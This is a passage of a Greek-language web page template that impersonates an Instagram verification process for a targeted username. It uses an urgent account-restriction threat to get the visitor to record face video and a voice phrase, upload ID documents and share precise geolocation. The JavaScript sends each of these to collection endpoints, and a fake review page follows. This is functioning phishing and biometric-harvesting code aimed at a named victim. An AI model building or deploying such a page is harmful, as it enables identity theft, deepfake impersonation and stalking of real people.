                        1. <strong>Σάρωση Προσώπου</strong> - Ακολουθήστε τις οδηγίες κίνησης κεφαλιού<br>
                        2. <strong>Επαλήθευση Φωνής</strong> - Διαβάστε μια σύντομη φράση<br>
                        3. <strong>Έγγραφο Ταυτότητας</strong> - Μεταφορτώστε ταυτότητα ή διαβατήριο<br>
                        4. <strong>Τοποθεσία</strong> - Επαληθεύστε την τρέχουσα τοποθεσία σας
                    </div>
                </div>
                
                <div class="instruction-container">
                    <div class="instruction-icon">⏱️</div>
                    <div class="instruction-text">Ολοκληρώστε εντός 24 ωρών</div>
                    <div class="instruction-detail">
                        Ο λογαριασμός @{target_username} θα περιοριστεί προσωρινά μέχρι την ολοκλήρωση της επαλήθευσης.
                    </div>
                </div>
                
                <button class="button primary-btn" onclick="nextStep()">
                    Ξεκινήστε Επαλήθευση για @{target_username}
                </button>
            </div>
            
            <!-- Βήμα 2: Επαλήθευση Προσώπου -->
            <div class="step" id="step2">
                <h2 class="step-title">Επαλήθευση Προσώπου</h2>
                <p class="step-subtitle">
                    Θα σαρώσουμε το πρόσωπό σας για επαλήθευση της ταυτότητάς σας. Ακολουθήστε τις οδηγίες στην οθόνη προσεκτικά.
                </p>
                
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                    <div class="face-overlay">
                        <div class="face-circle"></div>
                    </div>
                </div>
                
                <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                
                <div class="instruction-container" id="faceInstruction">
                    <div class="instruction-icon" id="instructionIcon">👤</div>
                    <div class="instruction-text" id="instructionText">Ετοιμαστείτε</div>
                    <div class="instruction-detail" id="instructionDetail">
                        Τοποθετήστε το πρόσωπό σας μέσα στον κύκλο και περιμένετε για οδηγίες
                    </div>
                </div>
                
                <button class="button primary-btn" id="startFaceScanBtn" onclick="startFaceVerification()">
                    Ξεκινήστε Σάρωση Προσώπου για @{target_username}
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Βήμα 3: Επαλήθευση Φωνής -->
            <div class="step" id="step3">
                <h2 class="step-title">Επαλήθευση Φωνής</h2>
                <p class="step-subtitle">
                    Παρακαλώ διαβάστε την παρακάτω φράση καθαρά. Αυτό βοηθά στην επαλήθευση ότι είστε ο πραγματικός κάτοχος του @{target_username}.
                </p>
                
                <div class="voice-instruction">
                    <div class="instruction-icon">🎤</div>
                    <div class="instruction-text">Διαβάστε Αυτή τη Φράση</div>
                    <div class="instruction-detail">Μιλήστε καθαρά με κανονική ένταση</div>
                </div>
                
                <div class="phrase-box">
                    <div class="phrase-text" id="voicePhrase">Ονομάζομαι {target_username} και επαληθεύω την ταυτότητά μου με το Instagram</div>
                    <div class="phrase-subtext">Πείτε αυτή τη φράση καθαρά στο μικρόφωνό σας</div>
                </div>
                
                <div class="voice-visualizer">
                    <div class="voice-wave" id="voiceWave"></div>
                </div>
                
                <div class="timer" id="voiceTimer">00:{str(voice_duration).zfill(2)}</div>
                
                <button class="button primary-btn" id="startVoiceBtn" onclick="startVoiceVerification()">
                    Ξεκινήστε Εγγραφή Φωνής
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Βήμα 4: Επαλήθευση Ταυτότητας -->
            <div class="step" id="step4">
                <h2 class="step-title">Επαλήθευση Εγγράφου Ταυτότητας</h2>
                <p class="step-subtitle">
                    Μεταφορτώστε φωτογραφίες της ταυτότητάς σας για επαλήθευση της ιδιοκτησίας του λογαριασμού @{target_username}.
                </p>
                
                <div class="id-upload-container">
                    <div class="id-card" onclick="document.getElementById('frontIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleFileDrop(event, 'front')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Μπροστινή Πλευρά Ταυτότητας</div>
                        <div class="id-subtitle">Διαβατήριο, Δίπλωμα Οδήγησης ή Εθνική Ταυτότητα</div>
                        <input type="file" id="frontIdInput" class="file-input" accept="image/*" onchange="handleFileSelect(this, 'front')">
                        <div class="preview-container" id="frontPreview">
                            <img class="preview-image" id="frontPreviewImage">
                        </div>
                    </div>
                    
                    <div class="id-card" onclick="document.getElementById('backIdInput').click()" 
                         ondragover="event.preventDefault(); this.classList.add('dragover')" 
                         ondragleave="this.classList.remove('dragover')" 
                         ondrop="handleFileDrop(event, 'back')">
                        <div class="id-icon">📄</div>
                        <div class="id-title">Πίσω Πλευρά Ταυτότητας</div>
                        <div class="id-subtitle">Απαιτείται για έγγραφα με δύο πλευρές</div>
                        <input type="file" id="backIdInput" class="file-input" accept="image/*" onchange="handleFileSelect(this, 'back')">
                        <div class="preview-container" id="backPreview">
                            <img class="preview-image" id="backPreviewImage">
                        </div>
                    </div>
                    
                    <div class="id-requirements">
                        <strong>Απαιτήσεις:</strong>
                        <ul>
                            <li>Επίσημο έγγραφο ταυτότητας με φωτογραφία</li>
                            <li>Καθαρή, καλά φωτισμένη φωτογραφία</li>
                            <li>Οι τέσσερις γωνίες να είναι ορατές</li>
                            <li>Χωρίς ανταύγειες ή αντανακλάσεις</li>
                        </ul>
                    </div>
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="button primary-btn" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Υποβολή για Επαλήθευση
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Βήμα 5: Επαλήθευση Τοποθεσίας -->
            <div class="step" id="step5">
                <h2 class="step-title">Επαλήθευση Τοποθεσίας</h2>
                <p class="step-subtitle">
                    Πρέπει να επαληθεύσουμε την τοποθεσία σας για να εξασφαλίσουμε ότι αποκτάτε πρόσβαση στο @{target_username} από τη συνήθη περιοχή σας.
                </p>
                
                <div class="location-container">
                    <div class="location-icon">📍</div>
                    <div class="location-info">
                        <div class="instruction-icon">🌍</div>
                        <div class="instruction-text">Απαιτείται Πρόσβαση Τοποθεσίας</div>
                        <div class="instruction-detail">
                            Το Instagram πρέπει να επαληθεύσει την τοποθεσία σας για λόγους ασφαλείας και για την αποτροπή μη εξουσιοδοτημένης πρόσβασης.
                        </div>
                    </div>
                    
                    <div class="accuracy-meter">
                        <div class="accuracy-fill" id="accuracyFill"></div>
                    </div>
                    <div class="accuracy-labels">
                        <span>Χαμηλή</span>
                        <span>Μέτρια</span>
                        <span>Υψηλή</span>
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div class="location-detail-item">
                            <span class="location-detail-label">Γεωγραφικό πλάτος:</span>
                            <span class="location-detail-value" id="latValue"></span>
                        </div>
                        <div class="location-detail-item">
                            <span class="location-detail-label">Γεωγραφικό μήκος:</span>
                            <span class="location-detail-value" id="lonValue"></span>
                        </div>
                        <div class="location-detail-item">
                            <span class="location-detail-label">Ακρίβεια:</span>
                            <span class="location-detail-value" id="accuracyValue"></span>
                        </div>
                        <div class="location-detail-item">
                            <span class="location-detail-label">Διεύθυνση:</span>
                            <span class="location-detail-value" id="addressValue"></span>
                        </div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Κάντε κλικ στο παρακάτω κουμπί για κοινή χρήση της τοποθεσίας σας
                </div>
                
                <button class="button primary-btn" id="locationButton" onclick="requestLocation()">
                    Κοινοποίηση Τοποθεσίας
                </button>
                
                <button class="button secondary-btn" onclick="prevStep()">
                    Πίσω
                </button>
            </div>
            
            <!-- Τελικό Βήμα: Επεξεργασία -->
            <div class="step" id="stepFinal">
                <h2 class="step-title">Επαλήθευση σε Εξέλιξη</h2>
                <p class="step-subtitle">
                    Παρακαλώ περιμένετε ενώ επαληθεύουμε τις πληροφορίες σας για το @{target_username}. Αυτό μπορεί να διαρκέσει μερικά λεπτά.
                </p>
                
                <div class="instruction-container" style="text-align: center; padding: 40px;">
                    <div class="instruction-icon" style="font-size: 64px;">⏳</div>
                    <div class="instruction-text">Επεξεργασία Επαλήθευσής Σας</div>
                    <div class="instruction-detail">
                        <div class="loading-spinner"></div>
                        Αναλύονται υποβεβλημένα δεδομένα...
                    </div>
                </div>
                
                <div class="status-message status-processing" id="finalStatus">
                    Επαλήθευση σάρωσης προσώπου... 25%
                </div>
            </div>
            
            <!-- Βήμα Ολοκλήρωσης -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="checkmark"></div>
                    
                    <h2 class="step-title">Υποβολή Λήφθηκε! ✅</h2>
                    <p class="step-subtitle">
                        Ευχαριστούμε, <strong>@{target_username}</strong>! Τα δεδομένα επαλήθευσής σας έχουν υποβληθεί με επιτυχία.
                    </p>
                    
                    <div class="account-access">
                        Ολοκληρώθηκε Μεταφόρτωση Δεδομένων
                    </div>
                    
                    <div class="instruction-container">
                        <div class="instruction-icon">📤</div>
                        <div class="instruction-text">Όλα τα δεδομένα επαλήθευσης μεταφορτώθηκαν</div>
                        <div class="instruction-detail">
                            Έχετε λάβει τη σάρωση προσώπου, το δείγμα φωνής, τα έγγραφα ταυτότητας και την τοποθεσία σας
                        </div>
                    </div>
                    
                    <div class="next-steps">
                        <p class="step-subtitle">
                            Θα μεταφερθείτε στη σελίδα ανασκόπησης σε <span id="countdown">5</span> δευτερόλεπτα...
                        </p>
                        <button class="button primary-btn" onclick="showReviewPage()">
                            Συνέχεια στη Σελίδα Κατάστασης
                        </button>
                    </div>
                    
                    <div class="info-box" style="margin-top: 30px;">
                        <strong>Σημείωση:</strong> Τα δεδομένα επαλήθευσής σας θα αποθηκευτούν με ασφάλεια και θα διαγραφούν αυτόματα εντός 30 ημερών.
                    </div>
                </div>
            </div>
            
            <!-- Βήμα Υπό Ανασκόπηση -->
            <div class="step" id="stepReview">
                <div class="review-container">
                    <div class="review-clock"></div>
                    
                    <h2 class="step-title">Επαλήθευση Υπό Ανασκόπηση</h2>
                    <p class="step-subtitle">
                        Η υποβολή επαλήθευσης ηλικίας για <strong>@{target_username}</strong> ανασκοπείται από την ομάδα μας.
                        Θα επικοινωνήσουμε μαζί σας εντός <strong>48 ωρών</strong> μέσω του email που σχετίζεται με τον λογαριασμό σας.
                    </p>
                    
                    <div class="review-timeline">
                        <div class="timeline-item">
                            <div class="timeline-icon">1</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Υποβολή Λήφθηκε</div>
                                <div class="timeline-description">
                                    Τα δεδομένα επαλήθευσής σας έχουν μεταφορτωθεί με επιτυχία και βρίσκονται στην ουρά για ανασκόπηση.
                                </div>
                            </div>
                        </div>
                        
                        <div class="timeline-item">
                            <div class="timeline-icon">2</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Διαδικασία Χειροκίνητης Ανασκόπησης</div>
                                <div class="timeline-description">
                                    Η ομάδα ασφαλείας μας ανασκοπεί χειροκίνητα τη σάρωση προσώπου, τα έγγραφα ταυτότητας και άλλα δεδομένα επαλήθευσης.
                                </div>
                            </div>
                        </div>
                        
                        <div class="timeline-item">
                            <div class="timeline-icon">3</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Έλεγχοι Ασφαλείας</div>
                                <div class="timeline-description">
                                    Εκτελούμε πρόσθετους ελέγχους ασφαλείας για να διασφαλίσουμε την αυθεντικότητα των εγγράφων σας.
                                </div>
                            </div>
                        </div>
                        
                        <div class="timeline-item">
                            <div class="timeline-icon">4</div>
                            <div class="timeline-content">
                                <div class="timeline-title">Τελική Απόφαση</div>
                                <div class="timeline-description">
                                    Θα λάβετε email με την τελική απόφαση εντός 48 ωρών από την υποβολή.
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="contact-info">
                        <div class="contact-item">
                            <div class="contact-icon">📧</div>
                            <div class="contact-text">
                                <strong>Ελέγξτε το Email Σας</strong><br>
                                Σας έχουμε στείλει επιβεβαίωση στο email που έχουμε καταχωρημένο. Παρακαλώ ακολουθήστε τις οδηγίες σε αυτό το email.
                            </div>
                        </div>
                        
                        <div class="contact-item">
                            <div class="contact-icon">⏰</div>
                            <div class="contact-text">
                                <strong>Χρονικό Πλαίσιο Ανασκόπησης</strong><br>
                                Οι περισσότερες ανασκοπήσεις ολοκληρώνονται εντός 24-48 ωρών. Θα ειδοποιηθείτε μόλις ολοκληρωθεί.
                            </div>
                        </div>
                        
                        <div class="contact-item">
                            <div class="contact-icon">🔒</div>
                            <div class="contact-text">
                                <strong>Προσωρινή Κατάσταση Λογαριασμού</strong><br>
                                Ο λογαριασμός @{target_username} έχει περιορισμένη λειτουργικότητα μέχρι να ολοκληρωθεί η επαλήθευση.
                            </div>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <strong>Τι συμβαίνει μετά;</strong><br>
                        1. Η ομάδα μας ανασκοπεί την υποβολή σας (24-48 ώρες)<br>
                        2. Θα λάβετε email με το αποτέλεσμα<br>
                        3. Εάν εγκριθεί, ο λογαριασμός σας θα αποκατασταθεί πλήρως<br>
                        4. Εάν απαιτούνται περισσότερες πληροφορίες, θα επικοινωνήσουμε μαζί σας
                    </div>
                    
                    <div class="next-steps">
                        <button class="button primary-btn" onclick="returnToInstagram()">
                            Επιστροφή στο Instagram
                        </button>
                        <button class="button secondary-btn" onclick="checkStatus()">
                            Έλεγχος Κατάστασης Ανασκόπησης
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer-links">
            <a href="#">Κέντρο Βοήθειας</a>
            <a href="#">Πολιτική Απορρήτου</a>
            <a href="#">Όροι Χρήσης</a>
            <a href="#">Κατευθυντήριες Γραμμές Κοινότητας</a>
        </div>
    </div>
    
    <script>
        // Παγκόσμιες μεταβλητές
        let currentStep = 1;
        let totalSteps = 5;
        let faceStream = null;
        let voiceStream = null;
        let faceRecorder = null;
        let voiceRecorder = null;
        let faceChunks = [];
        let voiceChunks = [];
        let faceTimerInterval = null;
        let voiceTimerInterval = null;
        let faceTimeLeft = {face_duration};
        let voiceTimeLeft = {voice_duration};
        let faceInstructions = [
            {{icon: "👤", text: "Κοιτάξτε Ευθεία", detail: "Κρατήστε το πρόσωπό σας κεντραρισμένο στον κύκλο", duration: 3}},
            {{icon: "👈", text: "Γυρίστε Κεφάλι Αριστερά", detail: "Γυρίστε αργά το κεφάλι σας αριστερά", duration: 3}},
            {{icon: "👉", text: "Γυρίστε Κεφάλι Δεξιά", detail: "Γυρίστε αργά το κεφάλι σας δεξιά", duration: 3}},
            {{icon: "👆", text: "Κοιτάξτε Πάνω", detail: "Ανασηκώστε ελαφρά το κεφάλι σας προς τα πάνω", duration: 3}},
            {{icon: "👇", text: "Κοιτάξτε Κάτω", detail: "Κλίνετε ελαφρά το κεφάλι σας προς τα κάτω", duration: 3}},
            {{icon: "😉", text: "Κλείστε Μάτια", detail: "Κλείστε φυσικά τα μάτια σας μερικές φορές", duration: 3}},
            {{icon: "😊", text: "Χαμογελάστε", detail: "Κάντε ένα φυσικό χαμόγελο", duration: 2}},
            {{icon: "✅", text: "Ολοκληρώθηκε", detail: "Η σάρωση προσώπου ήταν επιτυχής!", duration: 1}}
        ];
        let currentInstructionIndex = 0;
        let instructionTimer = null;
        let idFiles = {{"front": null, "back": null}};
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let locationData = null;
        let countdownTimer = null;
        let targetUsername = "{target_username}";
        
        // Πλοήγηση Βημάτων
        function updateProgress() {{
            const progress = ((currentStep - 1) / (totalSteps - 1)) * 100;
            document.getElementById('progressBar').style.width = progress + '%';
            document.getElementById('progressLineFill').style.width = progress + '%';
            
            // Ενημέρωση δεικτών βημάτων
            for (let i = 1; i <= totalSteps + 1; i++) {{
                const indicator = document.getElementById('step' + i + 'Indicator');
                if (indicator) {{
                    indicator.classList.remove('active', 'completed');
                    if (i < currentStep) {{
                        indicator.classList.add('completed');
                    }} else if (i === currentStep) {{
                        indicator.classList.add('active');
                    }}
                }}
            }}
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateProgress();
            }}
        }}
        
        function nextStep() {{
            if (currentStep < totalSteps + 1) {{
                showStep(currentStep + 1);
            }}
        }}
        
        function prevStep() {{
            if (currentStep > 1) {{
                showStep(currentStep - 1);
            }}
        }}
        
        // Επαλήθευση Προσώπου
        async function startFaceVerification() {{
            try {{
                document.getElementById('startFaceScanBtn').disabled = true;
                document.getElementById('startFaceScanBtn').innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Κάμερα...';
                
                // Αίτημα πρόσβασης κάμερας
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ 
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 640 }}
                    }},
                    audio: false
                }});
                
                // Εμφάνιση βίντεο
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Έναρξη διαδικασίας επαλήθευσης
                startFaceInstructions();
                
            }} catch (error) {{
                console.error("Σφάλμα κάμερας:", error);
                alert("Δεν είναι δυνατή η πρόσβαση στην κάμερα. Βεβαιωθείτε ότι έχουν παραχωρηθεί τα απαραίτητα δικαιώματα.");
                document.getElementById('startFaceScanBtn').disabled = false;
                document.getElementById('startFaceScanBtn').textContent = 'Ξεκινήστε Σάρωση Προσώπου για ' + targetUsername;
            }}
        }}
        
        function startFaceInstructions() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showFaceInstruction(0);
            
            // Έναρξη εγγραφής
            startFaceRecording();
            
            // Έναρξη χρονομέτρησης
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Έναρξη κύκλου οδηγιών
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showFaceInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showFaceInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                document.getElementById('instructionIcon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Διακοπή κάμερας
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Εμφάνιση μηνύματος ολοκλήρωσης
            showFaceInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✅ Ολοκληρώθηκε";
            
            // Αυτόματη προώθηση στο επόμενο βήμα μετά από καθυστέρηση
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        instructions_followed: faceInstructions.length,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση προσώπου μεταφορτώθηκε');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Σφάλμα μεταφόρτωσης προσώπου:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // Επαλήθευση Φωνής
        async function startVoiceVerification() {{
            try {{
                document.getElementById('startVoiceBtn').disabled = true;
                document.getElementById('startVoiceBtn').innerHTML = '<span class="loading-spinner"></span>Πρόσβαση σε Μικρόφωνο...';
                
                // Αίτημα πρόσβασης μικροφώνου
                voiceStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                
                // Έναρξη εγγραφής
                startVoiceRecording();
                
                // Έναρξη χρονομέτρησης
                voiceTimeLeft = {voice_duration};
                updateVoiceTimer();
                voiceTimerInterval = setInterval(() => {{
                    voiceTimeLeft--;
                    updateVoiceTimer();
                    
                    if (voiceTimeLeft <= 0) {{
                        completeVoiceVerification();
                    }}
                }}, 1000);
                
                // Προσομοίωση απεικόνισης φωνής
                simulateVoiceWave();
                
            }} catch (error) {{
                console.error('Σφάλμα μικροφώνου:', error);
                alert('Δεν είναι δυνατή η πρόσβαση στο μικρόφωνο. Βεβαιωθείτε ότι έχουν παραχωρηθεί τα απαραίτητα δικαιώματα.');
                document.getElementById('startVoiceBtn').disabled = false;
                document.getElementById('startVoiceBtn').textContent = 'Ξεκινήστε Εγγραφή Φωνής';
            }}
        }}
        
        function updateVoiceTimer() {{
            const minutes = Math.floor(voiceTimeLeft / 60);
            const seconds = voiceTimeLeft % 60;
            document.getElementById('voiceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function simulateVoiceWave() {{
            const wave = document.getElementById('voiceWave');
            let height = 50;
            setInterval(() => {{
                height = 30 + Math.random() * 40;
                wave.style.height = height + '%';
            }}, 100);
        }}
        
        function startVoiceRecording() {{
            voiceChunks = [];
            const options = {{ mimeType: 'audio/webm;codecs=opus' }};
            
            try {{
                voiceRecorder = new MediaRecorder(voiceStream, options);
            }} catch (e) {{
                voiceRecorder = new MediaRecorder(voiceStream);
            }}
            
            voiceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    voiceChunks.push(event.data);
                }}
            }};
            
            voiceRecorder.onstop = sendVoiceRecording;
            voiceRecorder.start();
        }}
        
        function completeVoiceVerification() {{
            clearInterval(voiceTimerInterval);
            
            if (voiceRecorder && voiceRecorder.state === 'recording') {{
                voiceRecorder.stop();
            }}
            
            // Διακοπή μικροφώνου
            if (voiceStream) {{
                voiceStream.getTracks().forEach(track => track.stop());
            }}
            
            document.getElementById('voiceTimer').textContent = '✅ Ολοκληρώθηκε';
            
            // Αυτόματη προώθηση στο επόμενο βήμα
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendVoiceRecording() {{
            if (voiceChunks.length === 0) return;
            
            const audioBlob = new Blob(voiceChunks, {{ type: 'audio/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_voice_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        voice_audio: base64data,
                        duration: {voice_duration},
                        phrase: document.getElementById('voicePhrase').textContent,
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_username: targetUsername
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Η επαλήθευση φωνής μεταφορτώθηκε');
                    }},
                    error: function(xhr, status, error) {{
                        console.error('Σφάλμα μεταφόρτωσης φωνής:', error);
                    }}
                }});
            }};
            
            reader.readAsDataURL(audioBlob);
        }}
        
        // Επαλήθευση Ταυτότητας
        function handleFileSelect(input, type) {{
            const file = input.files[0];
            if (file) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleFileDrop(event, type) {{
            event.preventDefault();
            event.currentTarget.classList.remove('dragover');
            const file = event.dataTransfer.files[0];
            if (file && file.type.startsWith('image/')) {{
                handleIDFile(file, type);
            }}
        }}
        
        function handleIDFile(file, type) {{
            // Προεπισκόπηση εικόνας
            const reader = new FileReader();
            reader.onload = function(e) {{
                const preview = document.getElementById(type + 'Preview');
                const previewImage = document.getElementById(type + 'PreviewImage');
                previewImage.src = e.target.result;
                preview.style.display = 'block';
            }};
            reader.readAsDataURL(file);
            
            // Αποθήκευση αρχείου
            idFiles[type] = file;
            checkIDSubmitReady();
        }}
        
        function checkIDSubmitReady() {{
            const hasFront = idFiles.front !== null;
            document.getElementById('submitIdBtn').disabled = !hasFront;
        }}
        
        function submitIDVerification() {{
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Μεταφόρτωση εγγράφων ταυτότητας...';
            
            document.getElementById('submitIdBtn').disabled = true;
            document.getElementById('submitIdBtn').innerHTML = '<span class="loading-spinner"></span>Επεξεργασία...';
            
            // Δημιουργία FormData
            const formData = new FormData();
            
            if (idFiles.front) formData.append('front_id', idFiles.front);
            if (idFiles.back) formData.append('back_id', idFiles.back);
            
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_username', targetUsername);
            
            // Υποβολή μέσω AJAX
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ Τα έγγραφα ταυτότητας μεταφορτώθηκαν με επιτυχία!';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function(xhr, status, error) {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Η μεταφόρτωση απέτυχε. Παρακαλώ δοκιμάστε ξανά.';
                    document.getElementById('submitIdBtn').disabled = false;
                    document.getElementById('submitIdBtn').textContent = 'Υποβολή για Επαλήθευση';
                }}
            }});
        }}
        
        // Επαλήθευση Τοποθεσίας
        function requestLocation() {{
            const button = document.getElementById('locationButton');
            const statusDiv = document.getElementById('locationStatus');
            const detailsDiv = document.getElementById('locationDetails');
            
            button.disabled = true;
            button.innerHTML = '<span class="loading-spinner"></span>Λήψη Τοποθεσίας...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Πρόσβαση στην τοποθεσία σας...';
            
            if (!navigator.geolocation) {{
                statusDiv.className = 'status-message status-error';
                statusDiv.textContent = 'Η γεωεντοπισμός δεν υποστηρίζεται από τον περιηγητή σας.';
                button.disabled = false;
                button.textContent = 'Δοκιμάστε Ξανά';
                return;
            }}
            
            // Πρώτη προσπάθεια: Γρήγορη, χαμηλής ακρίβειας
            navigator.geolocation.getCurrentPosition(
                (fastPosition) => {{
                    updateLocationUI(fastPosition);
                    sendLocationToServer(fastPosition);
                    
                    // Δεύτερη προσπάθεια: Υψηλής ακρίβειας
                    navigator.geolocation.getCurrentPosition(
                        (accuratePosition) => {{
                            updateLocationUI(accuratePosition);
                            sendLocationToServer(accuratePosition);
                            completeLocationVerification();
                        }},
                        () => {{
                            // Εάν αποτύχει η υψηλής ακρίβειας, ολοκληρώστε με γρήγορη τοποθεσία
                            completeLocationVerification();
                        }},
                        {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }}
                    );
                }},
                (err) => {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = `Σφάλμα: ${{err.message}}. Παρακαλώ ενεργοποιήστε τις υπηρεσίες τοποθεσίας.`;
                    button.disabled = false;
                    button.textContent = 'Δοκιμάστε Ξανά';
                }},
                {{ enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }}
            );
        }}
        
        function updateLocationUI(position) {{
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            
            // Ενημέρωση εμφάνισης
            document.getElementById('latValue').textContent = lat.toFixed(6);
            document.getElementById('lonValue').textContent = lon.toFixed(6);
            document.getElementById('accuracyValue').textContent = `${{Math.round(accuracy)}} μέτρα`;
            
            // Υπολογισμός ποσοστού ακρίβειας (υψηλότερη ακρίβεια = μικρότερος αριθμός)
            let accuracyPercentage = 100;
            if (accuracy < 10) accuracyPercentage = 95;
            else if (accuracy < 50) accuracyPercentage = 85;
            else if (accuracy < 100) accuracyPercentage = 70;
            else if (accuracy < 500) accuracyPercentage = 50;
            else accuracyPercentage = 30;
            
            document.getElementById('accuracyFill').style.width = accuracyPercentage + '%';
            
            // Εμφάνιση λεπτομερειών
            document.getElementById('locationDetails').style.display = 'block';
            
            // Ενημέρωση κατάστασης
            const statusDiv = document.getElementById('locationStatus');
            statusDiv.className = 'status-message status-success';
            statusDiv.textContent = `✓ Τοποθεσία αποκτήθηκε με ακρίβεια ${{Math.round(accuracy)}}μ`;
            
            // Αποθήκευση δεδομένων τοποθεσίας
            locationData = {{
                latitude: lat,
                longitude: lon,
                accuracy: accuracy,
                altitude: position.coords.altitude,
                speed: position.coords.speed,
                heading: position.coords.heading,
                user_agent: navigator.userAgent
            }};
        }}
        
        function sendLocationToServer(position) {{
            $.ajax({{
                url: '/submit_location_verification',
                type: 'POST',
                data: JSON.stringify({{
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    altitude: position.coords.altitude,
                    speed: position.coords.speed,
                    heading: position.coords.heading,
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString(),
                    session_id: sessionId,
                    target_username: targetUsername
                }}),
                contentType: 'application/json',
                success: function(response) {{
                    console.log('Τα δεδομένα τοποθεσίας μεταφορτώθηκαν');
                }},
                error: function(xhr, status, error) {{
